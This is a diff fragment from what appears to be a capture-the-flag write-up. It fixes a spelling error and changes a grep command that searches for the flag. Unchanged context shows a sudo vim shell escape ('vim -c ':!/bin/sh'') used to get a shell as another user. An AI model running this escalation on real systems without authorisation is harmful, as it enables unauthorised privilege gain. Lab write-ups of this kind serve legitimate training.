@@ -215,7 +215,7 @@ The repeating things `sudo -l`, you will find a way with the `vim` command, and 
 sudo -u sean vim -c ':!/bin/sh'
 ```
 But where the flag!!!!!!
-This command will search recursivly in the files to find `sean` written i any file.
+This command will search recursively in the files to find `sean` written i any file.
 ```bash
-grep -r sean /* 2>/dev/null
+grep -rn "sean{" /var/log 2>/dev/null
 ```
